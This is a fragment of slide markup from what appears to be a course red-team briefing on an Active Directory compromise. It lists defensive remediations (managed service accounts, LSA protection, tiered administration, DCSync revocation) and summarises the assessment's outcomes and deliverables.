              <a:t>Replace static service passwords with Group Managed Service Accounts (120-char auto-rotated passwords).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4. Enable LSA Protection &amp; Credential Guard (MEDIUM): </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Deploy HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL=1 to block LSASS memory dumping by Mimikatz.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5. Implement Microsoft Tiered Administration (STRATEGIC): </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Enforce administrative tier boundaries (Tier 0 DC, Tier 1 Servers, Tier 2 Endpoints) to prevent credential theft escalation.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Priority: Implement immediate DCSync revocation and ACL cleanup within 24 hours.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Calibri"/>
              </a:rPr>
              <a:t>CY376 RED TEAM BRIEFING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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>8. Conclusion &amp; Technical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102714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Calibri"/>
              </a:rPr>
              <a:t>Summary of Assessment Key Outcomes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Domain Compromise Proven: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>12-stage attack chain successfully executed from low-privilege hporter to full DC01 Administrator.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Zero False Positives: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>All stages empirically validated with CLI outputs, screenshots, and BloodHound graphs.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Actionable Defense Strategy: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Clear prioritised remediation steps provided to break every link in the attack chain.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9E0B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>• </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Deliverables Delivered: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Comprehensive Pentest Report (DOCX/PDF) and Executive Briefing Slide Deck (PPTX).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>KEY FINDING: Thank you! Open for Questions &amp; Technical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